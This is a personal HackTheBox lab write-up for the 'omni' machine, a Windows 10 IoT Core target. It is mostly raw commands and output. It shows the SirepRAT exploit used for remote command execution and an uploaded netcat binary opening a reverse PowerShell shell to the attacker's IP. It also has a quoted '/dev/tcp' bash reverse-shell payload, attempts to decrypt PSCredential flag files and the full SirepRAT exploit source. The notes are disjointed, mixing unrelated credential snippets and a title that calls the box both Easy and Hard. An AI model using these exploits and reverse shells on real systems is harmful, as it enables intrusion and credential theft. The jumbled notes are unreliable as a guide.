---
title: Lab - HTB - Easy - omni (HackyHour4)
date: 2020-11-13 11:11:11 -0400
description: Learning Path
categories: [Lab, HackTheBox]
tags: [Lab, HackTheBox]
---

- [Lab - HTB - Hard - omni (HackyHour4)](#lab---htb---hard---omni-hackyhour4)
  - [Step 1: Recon](#step-1-recon)

---


# Lab - HTB - Hard - omni (HackyHour4)


<img alt="pic" src="https://i.imgur.com/GcY1wEq.png" width="700">


> Machine: omni


## Step 1: Recon

```bash
Remington Winters  21:18

Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-13 18:08 PST
Nmap scan report for omni.htb (10.10.10.204)
Host is up (0.16s latency).
Not shown: 65529 filtered ports
PORT      STATE SERVICE
135/tcp   open  msrpc
5985/tcp  open  wsman
8080/tcp  open  http-proxy
29817/tcp open  unknown
29819/tcp open  unknown
29820/tcp open  unknown


$ nmap -Pn -A -p- 10.10.10.204
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-21 01:40 UTC
Nmap scan report for omni.htb (10.10.10.204)
Host is up (0.010s latency).
Not shown: 65529 filtered ports
PORT      STATE SERVICE  VERSION
135/tcp   open  msrpc    Microsoft Windows RPC
5985/tcp  open  upnp     Microsoft IIS httpd
8080/tcp  open  upnp     Microsoft IIS httpd
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
# |_  Basic realm=Windows Device Portal    win device
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Site doesnt have a title.
29817/tcp open  unknown
29819/tcp open  arcserve ARCserve Discovery
29820/tcp open  unknown



# goto
http://10.10.10.204:8080/
# popup windows
ssh Administrator@10.10.10.204



# vulerability of Windows 10 IoT Core
# port 29817、29819、29820:
git clone https://github.com/SafeBreach-Labs/SirepRAT.git

pip3 install enum34
pip2 install enum34
pip2 install hexdump
pip install -r requirements.txt


python SirepRAT.py 10.10.10.204 GetFileInformationFromDevice
# LaunchCommandWithOutput
# PutFileOnDevice
# GetFileFromDevice
# GetFileInformationFromDevice
# GetSystemInformationFromDevice


# get system info
python2 SirepRAT.py 10.10.10.204 GetSystemInformationFromDevice
<SystemInformationResult | type: 51, payload length: 32, kv: {'wProductType': 0, 'wServicePackMinor': 2, 'dwBuildNumber': 17763, 'dwOSVersionInfoSize': 0, 'dwMajorVersion': 10, 'wSuiteMask': 0, 'dwPlatformId': 2, 'wReserved': 0, 'wServicePackMajor': 1, 'dwMinorVersion': 0, 'szCSDVersion': 0}>


python SirepRAT.py 10.10.10.204 GetFileFromDevice --remote_path "C:\Windows\System32\drivers\etc\hosts" --v
# Additionally, comments (such as these) may be inserted on individual
# lines or following the machine name denoted by a '#' symbol.
#
# For example:
#
#      102.54.94.97     rhino.acme.com          # source server
#       38.25.63.10     x.acme.com              # x client host

# localhost name resolution is handled within DNS itself.
#	127.0.0.1       localhost
#	::1             localhost
–


# put file and get file
python SirepRAT.py 10.10.10.204 PutFileOnDevice --remote_path "C:\Windows\System32\grace.txt" --data "Hello 2 grace!"
python SirepRAT.py 10.10.10.204 GetFileFromDevice --remote_path "C:\Windows\System32\grace.txt" --v
# Hello 2 grace!



# run command
python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c powershell"
# <HResultResult | type: 1, payload length: 4, HResult: 0x0>
# <OutputStreamResult | type: 11, payload length: 82, payload peek: 'Windows PowerShell Copyright (C) Microsoft Corpo'>
# <OutputStreamResult | type: 11, payload length: 24, payload peek: 'PS C:\windows\system32> '>



# upload something
python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c powershell Invoke-Webrequest -Outfile C:\blah.txt -Uri http://10.10.15.28/inject.sql" --v
python SirepRAT.py 10.10.10.204 GetFileFromDevice --remote_path "C:\blah.txt" --v
# ---------
# CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
# 	String[] command = {"bash", "-c", cmd};
# 	java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
# 	return s.hasNext() ? s.next() : "";  }
# $$;
# CALL SHELLEXEC('bash -i >& /dev/tcp/10.10.14.20/6969 0>&1')
# ---------




# put the output in to the file
python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c powershell ls C:\Data\Users\DefaultAccount > C:\Windows\System32\grace2.txt"
python SirepRAT.py 10.10.10.204 GetFileFromDevice --remote_path "C:\Windows\System32\grace2.txt" --v
# ---------
#     Directory: C:\Data\Users\DefaultAccount
# Mode                LastWriteTime         Length Name
# ----                -------------         ------ ----
# d-r---         7/3/2020  11:22 PM                3D Objects
# d-r---         7/3/2020  11:22 PM                Documents
# d-r---         7/3/2020  11:22 PM                Downloads
# d-----         7/3/2020  11:22 PM                Favorites
# d-r---         7/3/2020  11:22 PM                Music
# d-r---         7/3/2020  11:22 PM                Pictures
# d-r---         7/3/2020  11:22 PM                Videos
# ---------


python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c powershell ls C:\Data\Users > C:\Windows\System32\grace2.txt"
python SirepRAT.py 10.10.10.204 GetFileFromDevice --remote_path "C:\Windows\System32\grace2.txt" --v
# ---------
#     Directory: C:\Data\Users
# Mode                LastWriteTime         Length Name
# ----                -------------         ------ ----
# d-----         7/4/2020   9:48 PM                administrator
# d-----         7/4/2020   9:53 PM                app
# d-----         7/3/2020  11:22 PM                DefaultAccount
# d-----         7/3/2020  11:22 PM                DevToolsUser
# d-r---        8/21/2020   1:55 PM                Public
# d-----         7/4/2020  10:29 PM                System
# ---------



# -----------------------------------------------------------------------------------------------------------------------



# download the netcat
wget https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip
unzip netcat-win32-1.11.zip
sudo rm netcat-win32-1.11.zip


# open cd
# open web on my side
python -m SimpleHTTPServer 9000
# listen netcet at my side
netcat -nlvp 4455




# upload nv64.exe

# upload
python SirepRAT.py 10.10.10.204 PutFileOnDevice --remote_path "C:\test\nc64.exe" --data /home/kali/nc.exe/nc64.exe
# upload
python SirepRAT.py 10.10.10.204 PutFileOnDevice --remote_path "C:\Data\Users\app\gracepw.txt" --data /home/grace/htb4/SirepRAT/gracepw.txt

# run command to upload
python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c powershell.exe -command Invoke-WebRequest -Uri http://10.10.15.28:9002/nc64.exe -Outfile C:\tests\nc64.exe"


python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c powershell.exe -command Invoke-WebRequest -Uri http://10.10.15.28:9000/func.ps1 -Outfile C:\Data\Users\app\func.ps1"

python SirepRAT.py 10.10.10.204 GetFileInformationFromDevice --remote_path "C:\test\nc64.exe"

python SirepRAT.py 10.10.10.204 GetFileInformationFromDevice --remote_path "c:\Windows\nc64.exe"

# upload the netcat on target
python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c powershell Invoke-Webrequest -Outfile C:\nc64.exe -Uri http://10.10.15.28:9200/home/grace/htb4/netcat-1.11/nc64.exe" --v





# Execute File To Conect Back
python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c c:\Windows\nc64.exe 10.10.15.28 4455 -e powershell.exe"

python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c C:\test\nc64.exe 10.10.15.28 4455 -e powershell.exe" --v

# python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c powershell.exe -command C:\tests\nc64.exe 10.10.15.28 4455 -e powershell.exe"

python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c c:\nc64.exe 10.10.15.28 4455 -e powershell.exe" --v



# -----------------------------------------------------------------------------------------------------------------------



# the target > 10.10.15.28 4455 > my pc
# in the box


PS C:\Data\Users\administrator> ls
#     Directory: C:\Data\Users\administrator
# Mode                LastWriteTime         Length Name
# ----                -------------         ------ ----
# d-r---         7/3/2020  11:23 PM                3D Objects
# d-r---         7/3/2020  11:23 PM                Documents
# d-r---         7/3/2020  11:23 PM                Downloads
# d-----         7/3/2020  11:23 PM                Favorites
# d-r---         7/3/2020  11:23 PM                Music
# d-r---         7/3/2020  11:23 PM                Pictures
# d-r---         7/3/2020  11:23 PM                Videos
# -ar---         7/4/2020   9:48 PM           1958 root.txt



PS C:\Data\Users\administrator> cat root.txt
# <Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
#   <Obj RefId="0">
#     <TN RefId="0">
#       <T>System.Management.Automation.PSCredential</T>
#       <T>System.Object</T>
#     </TN>
#     <ToString>System.Management.Automation.PSCredential</ToString>
#     <Props>
#       <S N="UserName">flag</S>
#       <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb0100000011d9a9af9398c648be30a7dd764d1f3a000000000200000000001066000000010000200000004f4016524600b3914d83c0f88322cbed77ed3e3477dfdc9df1a2a5822021439b000000000e8000000002000020000000dd198d09b343e3b6fcb9900b77eb64372126aea207594bbe5bb76bf6ac5b57f4500000002e94c4a2d8f0079b37b33a75c6ca83efadabe077816aa2221ff887feb2aa08500f3cf8d8c5b445ba2815c5e9424926fca73fb4462a6a706406e3fc0d148b798c71052fc82db4c4be29ca8f78f0233464400000008537cfaacb6f689ea353aa5b44592cd4963acbf5c2418c31a49bb5c0e76fcc3692adc330a85e8d8d856b62f35d8692437c2f1b40ebbf5971cd260f738dada1a7</SS>
#     </Props>
#   </Obj>
# </Objs>


PS C:\Data\Users\app> cat user.txt
# <Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
#   <Obj RefId="0">
#     <TN RefId="0">
#       <T>System.Management.Automation.PSCredential</T>
#       <T>System.Object</T>
#     </TN>
#     <ToString>System.Management.Automation.PSCredential</ToString>
#     <Props>
#       <S N="UserName">flag</S>
#       <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb010000009e131d78fe272140835db3caa288536400000000020000000000106600000001000020000000ca1d29ad4939e04e514d26b9706a29aa403cc131a863dc57d7d69ef398e0731a000000000e8000000002000020000000eec9b13a75b6fd2ea6fd955909f9927dc2e77d41b19adde3951ff936d4a68ed750000000c6cb131e1a37a21b8eef7c34c053d034a3bf86efebefd8ff075f4e1f8cc00ec156fe26b4303047cee7764912eb6f85ee34a386293e78226a766a0e5d7b745a84b8f839dacee4fe6ffb6bb1cb53146c6340000000e3a43dfe678e3c6fc196e434106f1207e25c3b3b0ea37bd9e779cdd92bd44be23aaea507b6cf2b614c7c2e71d211990af0986d008a36c133c36f4da2f9406ae7</SS>
#     </Props>
#   </Obj>
# </Objs>



# ------------------------------ from txt to System.Security.SecureString
PS C:\>$encrypted
01000000d08c9ddf0115d1118c7a00c04fc297eb010000001a114d45b8dd3f4aa11ad7c0abdae9800000000002000000000003660000a8000000100000005df63cea84bfb7d70bd6842e7
efa79820000000004800000a000000010000000f10cd0f4a99a8d5814d94e0687d7430b100000008bf11f1960158405b2779613e9352c6d14000000e6b7bf46a9d485ff211b9b2a2df3bd
6eb67aae41
PS C:\>$secure2 = convertto-securestring -string $encrypted
PS C:\>$secure2
System.Security.SecureString



# ------------------------------ create PSCredential
$user99 = "flag"
$file99 = "gracepw.txt"
$passwor99 = ConvertTo-SecureString '01000000d08c9ddf0115d1118c7a00c04fc297eb010000009e131d78fe272140835db3caa288536400000000020000000000106600000001000020000000ca1d29ad4939e04e514d26b9706a29aa403cc131a863dc57d7d69ef398e0731a000000000e8000000002000020000000eec9b13a75b6fd2ea6fd955909f9927dc2e77d41b19adde3951ff936d4a68ed750000000c6cb131e1a37a21b8eef7c34c053d034a3bf86efebefd8ff075f4e1f8cc00ec156fe26b4303047cee7764912eb6f85ee34a386293e78226a766a0e5d7b745a84b8f839dacee4fe6ffb6bb1cb53146c6340000000e3a43dfe678e3c6fc196e434106f1207e25c3b3b0ea37bd9e779cdd92bd44be23aaea507b6cf2b614c7c2e71d211990af0986d008a36c133c36f4da2f9406ae7' -AsPlainText -Force
$credential99 = New-Object -TypeName "System.Management.Automation.PSCredential" -ArgumentList $User99, $passwor99
$session = New-PSSession -computer 10.10.10.204 -credential $credential

$bstr = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($SecureString);

$bstr = [Runtime.InteropServices.Marshal]::SecureStringToCoTaskMemUnicode($credential99);


# ------------------------------ the way to create pw 1
$user = "grace"
$password = ConvertTo-SecureString -String "password" -AsPlainText -Force
$credential = New-Object -TypeName "System.Management.Automation.PSCredential" -ArgumentList $user, $password

$session = New-PSSession -computer 10.10.10.204 -credential $credential
$result = Invoke-Command -Session $session -ScriptBlock {Add-PSSnapin vm*}
$result = Invoke-Command -Session $session -ScriptBlock {get-desktopvm -pool_id olanddesk}
$result
连接远程服务器使用
enter-pssession -computer ip -credential domain\username


# the way to create pw
$HexPass = Get-Content "c:\Data\Password.txt"
$Credential = New-Object -TypeName PSCredential -ArgumentList "adm.ms@easy365manager.com", ($HexPass | ConvertTo-SecureString)


$Ptr = [System.Runtime.InteropServices.Marshal]::SecureStringToCoTaskMemUnicode($password)
$result = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($Ptr)
[System.Runtime.InteropServices.Marshal]::ZeroFreeCoTaskMemUnicode($Ptr)
$result


$credentials99 = New-Object System.Net.NetworkCredential("flag", $passwor99, "TestDomain")
$credentials99.Password
TestPassword

$credentials99 | gm



# ------------------------- begin


$passwordgg = ConvertTo-SecureString '01000000d08c9ddf0115d1118c7a00c04fc297eb010000009e131d78fe272140835db3caa288536400000000020000000000106600000001000020000000ca1d29ad4939e04e514d26b9706a29aa403cc131a863dc57d7d69ef398e0731a000000000e8000000002000020000000eec9b13a75b6fd2ea6fd955909f9927dc2e77d41b19adde3951ff936d4a68ed750000000c6cb131e1a37a21b8eef7c34c053d034a3bf86efebefd8ff075f4e1f8cc00ec156fe26b4303047cee7764912eb6f85ee34a386293e78226a766a0e5d7b745a84b8f839dacee4fe6ffb6bb1cb53146c6340000000e3a43dfe678e3c6fc196e434106f1207e25c3b3b0ea37bd9e779cdd92bd44be23aaea507b6cf2b614c7c2e71d211990af0986d008a36c133c36f4da2f9406ae7' -AsPlainText -Force

$credentialgg = New-Object System.Management.Automation.PSCredential ('root', $passwordgg)

$credentials99=Get-Credential
$credentials99.GetNetworkCredential().UserName
TestUsername
$credentials99.GetNetworkCredential().Domain
TestDomain
$credentials99.GetNetworkCredential().Password
TestPassword


PS> $credentialgg.UserName
# root

PS> $credentialgg.GetNetworkCredential()
# UserName Domain
# -------- ------
# root

PS51> $credentialgg.GetNetworkCredential().Password
# MySecretPassword

$securePassword = '01000000d08c9ddf0115d1118c7a00c04fc297eb010000009e131d78fe272140835db3caa288536400000000020000000000106600000001000020000000ca1d29ad4939e04e514d26b9706a29aa403cc131a863dc57d7d69ef398e0731a000000000e8000000002000020000000eec9b13a75b6fd2ea6fd955909f9927dc2e77d41b19adde3951ff936d4a68ed750000000c6cb131e1a37a21b8eef7c34c053d034a3bf86efebefd8ff075f4e1f8cc00ec156fe26b4303047cee7764912eb6f85ee34a386293e78226a766a0e5d7b745a84b8f839dacee4fe6ffb6bb1cb53146c6340000000e3a43dfe678e3c6fc196e434106f1207e25c3b3b0ea37bd9e779cdd92bd44be23aaea507b6cf2b614c7c2e71d211990af0986d008a36c133c36f4da2f9406ae7'

$Credential.GetNetworkCredential().password

$credentialgg.GetNetworkCredential().password

$securePasswordgg = ConvertTo-SecureString –String $passwordgg -AsPlainText -Force
ConvertFrom-SecureString $securePasswordgg | Out-File C:\Data\Users\app\tmppassword.txt





function Get-PlainText()
{
	[CmdletBinding()]
	param
	(
		[parameter(Mandatory = $true)]
		[System.Security.SecureString]$SecureString
	)
	BEGIN { }
	PROCESS
	{
		$bstr = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($SecureString);
		try
		{
			return [Runtime.InteropServices.Marshal]::PtrToStringBSTR($bstr);
		}
		finally
		{
			[Runtime.InteropServices.Marshal]::FreeBSTR($bstr);
		}
	}
	END { }
}



```





SirepRAT.py

```
#!/usr/bin/env python
"""
BSD 3-Clause License

Copyright (c) 2017, SafeBreach Labs
All rights reserved.

Redistribution and use in source and binary forms, with or without
modification, are permitted provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this
  list of conditions and the following disclaimer.

* Redistributions in binary form must reproduce the above copyright notice,
  this list of conditions and the following disclaimer in the documentation
  and/or other materials provided with the distribution.

* Neither the name of the copyright holder nor the names of its
  contributors may be used to endorse or promote products derived from
  this software without specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.


File:       SirepRAT.py
Purpose:    Exploit Windows IoT Core's Sirep service to execute remote commands on the device
Author:     Dor Azouri <dor.azouri@safebreach.com>
Date:       2018-08-19 08:03:08
"""

import argparse
import logging
import socket
import string
import struct
import sys

import hexdump

from common.constants import SIREP_VERSION_GUID_LEN, LOGGING_FORMAT, LOGGING_LEVEL, SIREP_PORT, INT_SIZE, \
    LOGGING_DATA_TRUNCATION
from common.enums.CommandType import CommandType
from common.mappings import SIREP_COMMANDS, RESULT_TYPE_TO_RESULT

# Initialize logging
logging.basicConfig(format=LOGGING_FORMAT, level=LOGGING_LEVEL)


def get_command_ctor_arguments(sirep_command_type, args):
    command_args = []
    if sirep_command_type == CommandType.LaunchCommandWithOutput:
        command_args = [
            args.return_output,
            args.cmd,
            args.as_logged_on_user,
            args.args,
            args.base_directory
        ]
    elif sirep_command_type == CommandType.PutFileOnDevice:
        command_args = [
            args.remote_path,
            args.data
        ]
    elif sirep_command_type == CommandType.GetFileFromDevice:
        command_args = [
            args.remote_path,
        ]
    elif sirep_command_type == CommandType.GetFileInformationFromDevice:
        command_args = [
            args.remote_path,
        ]
    elif sirep_command_type == CommandType.GetSystemInformationFromDevice:
        pass
    else:
        logging.error("Command type not supported")
    command_args = [arg for arg in command_args if arg is not None]
    return command_args


def sirep_connect(sock, dst_ip, verbose=False):
    # Connect the socket to the port where the server is listening
    server_address = (dst_ip, SIREP_PORT)
    logging.debug('Connecting to %s port %s' % server_address)
    sock.connect(server_address)
    # Receive the server version GUID that acts as the service banner
    version_guid_banner = sock.recv(SIREP_VERSION_GUID_LEN)
    logging.info('Banner hex: %s' % version_guid_banner)
    if verbose:
        print "RECV:"
        hexdump.hexdump(version_guid_banner)


def sirep_send_command(sirep_con_sock, sirep_command, print_printable_data=False, verbose=False):
    # generate the commands's payload
    sirep_payload = sirep_command.serialize_sirep()
    logging.info('Sirep payload hex: %s' % sirep_payload.encode('hex'))
    if verbose:
        print "SEND:"
        hexdump.hexdump(sirep_payload)

    # Send the Sirep payload
    logging.debug("Sending Sirep payload")
    sirep_con_sock.sendall(sirep_payload)

    # Receive all result records
    result_record_type = -1
    records = []
    while True:
        try:
            first_int = sirep_con_sock.recv(0x4)
            if first_int == '':
                break
            result_record_type = int(struct.unpack("I", first_int)[0])
            logging.debug("Result record type: %d" % result_record_type)
            data_size = int(struct.unpack("I", sirep_con_sock.recv(0x4))[0])
            if data_size == 0:
                break

            logging.debug("Receiving %d bytes" % data_size)
            data = sirep_con_sock.recv(data_size)

            logging.info("Result record data hex: %s" % data[:LOGGING_DATA_TRUNCATION].encode('hex'))
            if verbose:
                print "RECV:"
                hexdump.hexdump(data)

            # If printable, print result record data as is
            if print_printable_data and all([x in string.printable for x in data]):
                logging.info("Result data readable print:")
                print "---------\n%s\n---------" % data
            records.append(first_int + data)
        except socket.timeout as e:
            logging.debug("timeout in command communication. Assuming end of conversation")
            break
    return records


def main(args):
    dst_ip = args.target_device_ip
    command_type = args.command_type
    sirep_command_type = getattr(CommandType, command_type)

    try:
        command_args = get_command_ctor_arguments(sirep_command_type, args)
    except:
        logging.error("Wrong usage. use --help for instructions")
        sys.exit()

    # Create a TCP/IP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(3)

    try:
        sirep_command_ctor = SIREP_COMMANDS[sirep_command_type]
        # create the requested sirep command
        try:
            sirep_command = sirep_command_ctor(*command_args)
        except TypeError:
            logging.error("Wrong usage. use --help for instructions")
            sys.exit()
        sirep_connect(sock, dst_ip, verbose=args.vv)
        sirep_result_buffers = sirep_send_command(sock, sirep_command, print_printable_data=args.v or args.vv,
                                                  verbose=args.vv)

        sirep_results = []
        for result_buffer in sirep_result_buffers:
            result_type_code = struct.unpack("I", result_buffer[:INT_SIZE])[0]
            sirep_result_ctor = RESULT_TYPE_TO_RESULT[result_type_code]
            sirep_result = sirep_result_ctor(result_buffer)
            print sirep_result
            sirep_results.append(sirep_result)
    finally:
        logging.debug("Closing socket")
        sock.close()

    return True


if "__main__" == __name__:
    available_command_types = [cmd_type.name for cmd_type in CommandType]
    example_usage = r'Usage example: python SirepRAT.py 192.168.3.17 GetFileFromDevice --remote_path ' \
                    r'C:\Windows\System32\hostname.exe'
    command_types_text_block = "available commands:\n*\t%s\n\n" % "\n*\t".join(available_command_types)
    remarks_text = "\n\nremarks:\n-\tUse moustaches to wrap remote environment variables to expand (e.g. {{" \
                   "userprofile}})\n\n"
    epilog_help_text = command_types_text_block + remarks_text + example_usage
    description_text = "Exploit Windows IoT Core's Sirep service to execute remote commands on the device"

    parser = argparse.ArgumentParser(description=description_text,
                                     usage='%(prog)s target_device_ip command_type [options]',
                                     formatter_class=lambda prog: argparse.RawTextHelpFormatter(prog, width=140),
                                     epilog=epilog_help_text)

    parser.add_argument('target_device_ip', type=str,
                        help="The IP address of the target IoT Core device")
    parser.add_argument('command_type', type=str,
                        choices=available_command_types,
                        help="The Sirep command to use. Available commands are listed below",
                        metavar='command_type')
    parser.add_argument('--return_output', action='store_true', default=False,
                        help="Set to have the target device return the command output stream")
    parser.add_argument('--cmd', type=str,
                        help="Program path to execute")
    parser.add_argument('--as_logged_on_user', action='store_true', default=False,
                        help="Set to impersonate currently logged on user on the target device")
    parser.add_argument('--args', type=str,
                        help="Arguments string for the program")
    parser.add_argument('--base_directory', type=str,
                        help="The working directory from which to run the desired program")
    parser.add_argument('--remote_path', type=str,
                        help="Path on target device")
    parser.add_argument('--data', type=str,
                        help="Data string to write to file")
    parser.add_argument('--v', action='store_true', default=False,
                        help="Verbose - if printable, print result")
    parser.add_argument('--vv', action='store_true', default=False,
                        help="Very verbose - print socket buffers and more")

    args = parser.parse_args()

    if args.command_type == CommandType.LaunchCommandWithOutput.name:
        if not args.cmd:
            parser.error('usage: python SirepRAT.py <target_device_ip> LaunchCommandWithOutput --cmd <program_path> ['
                         '--args <arguments_srting>] [--return_output] [--as_logged_on_user]')
    elif args.command_type == CommandType.PutFileOnDevice.name:
        if not args.remote_path:
            parser.error('usage: python SirepRAT.py <target_device_ip> PutFileOnDevice --remote_path '
                         '<remote_destination_path> [--data <data_to_write>]')
    elif args.command_type == CommandType.GetFileFromDevice.name:
        if not args.remote_path:
            parser.error('usage: python SirepRAT.py <target_device_ip> GetFileFromDevice --remote_path <remote_path>')
    elif args.command_type == CommandType.GetFileInformationFromDevice.name:
        if not args.remote_path:
            parser.error('usage: python SirepRAT.py <target_device_ip> GetFileInformationFromDevice --remote_path '
                         '<remote_path>')

    main(args)
```


---

ref:
- [github](https://github.com/SafeBreach-Labs/SirepRAT)
- [PowerShell - 解碼System.Security.SecureString爲可讀密碼](http://hk.uwenku.com/question/p-zubpcrmb-ys.html)
- [PowerShell - Get-Credential解碼密碼？](http://hk.uwenku.com/question/p-etehoiap-vb.html)
- [Decrypt PowerShell Secure String Password](https://devblogs.microsoft.com/scripting/decrypt-powershell-secure-string-password/)
- [PowerShell - Decode System.Security.SecureString to readable password](https://stackoverflow.com/questions/7468389/powershell-decode-system-security-securestring-to-readable-password)
- [Secure Password with PowerShell: Encrypting Credentials – Part 1](https://www.pdq.com/blog/secure-password-with-powershell-encrypting-credentials-part-1/)
- [PSCredential](https://www.easy365manager.com/pscredential/)
- [SecureString Class](https://docs.microsoft.com/en-us/dotnet/api/system.security.securestring?view=net-5.0)
- [PowerShell自动加载账号密码(Credential)](https://www.hotbak.net/key/%E5%8A%A0%E8%BD%BD%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81CredentialcQ215046120%E7%9A%84%E5%8D%9A%E5%AE%A2CSDN%E5%8D%9A%E5%AE%A2.html?__cf_chl_jschl_tk__=3e69070d4030385254fac4ca496d4c3991f969af-1607738792-0-AUQnWccIaluGMlCJdNCqTDC3LLqUcd8cMptjuojf0k9_etAKJ50nN-ae06mLp6oVJZVT4K_ZyjiC_5_mPfeI1wrpGUiqT3Vr1asdFSktwfcnDVmufvdgSEoGFhQLmde_RgRCCTHc8zdAC1pY_iko516_EQ_Xx1tnaIGKdJALI4DJfUKr274oc03MhM32LZHj75zhrp_i3F-tOQ4-pj4-FvXOyd0s7-HKC6aYUBS7547gO1b-yczmHeB10VKSwChn-PDKV4tPMVMN7zfLgujeaBSsDj_1D23amQOE2_L0a5Us5CfOFTvKD6P1iCRE1_uADv-JJzSgwmcGD9VTyelwHd80lHWPz2mC0L9Xh0dKIoLlJ6S-eBjceZMh3g5XUo7RVbTLEF8KU5q3XgShUWT7FZhmyn-IjZ5jSPW1XQQjJkRJtYV2V-zVzmGK6HXct81314kFn_YZtzb49d0b8s5-VnjiN10c6F0CpGfKysE5NynPBK24FRBUeZ4F_dQ-exyzk-UG61lOOGIw0cD49YS9syEaCs2oB5IsNMLKtR7lxoX5)
- [ConvertTo-SecureString的这种用法实现了什么？](https://stackoverrun.com/cn/q/7601500)
- [PowerShell: Encrypt and Decrypt Data by using Certificates (Public Key / Private Key)](https://sid-500.com/2017/10/29/powershell-encrypt-and-decrypt-data/)
- [PowerShell 脚本中的密码](https://www.cnblogs.com/sparkdev/p/7258507.html)
- [Using the PowerShell Get-Credential Cmdlet and all things credentials](https://adamtheautomator.com/powershell-get-credential/)
